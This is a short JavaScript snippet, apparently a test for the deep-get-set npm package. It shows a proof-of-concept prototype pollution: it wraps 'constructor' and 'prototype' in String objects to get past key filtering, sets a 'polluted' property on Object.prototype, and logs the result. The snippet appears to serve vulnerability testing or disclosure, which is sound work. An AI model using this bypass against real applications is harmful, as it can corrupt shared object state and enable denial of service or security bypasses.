// test("prototype pollution in deep-get-set", () => {
  const deep = require("deep-get-set");

console.log({}.polluted);

  //deep({}, [new String("__proto__"), "polluted"], "yes");
  deep({}, [new String("constructor"),new String("prototype"), "polluted"], "yes");
console.log({}.polluted);
// });
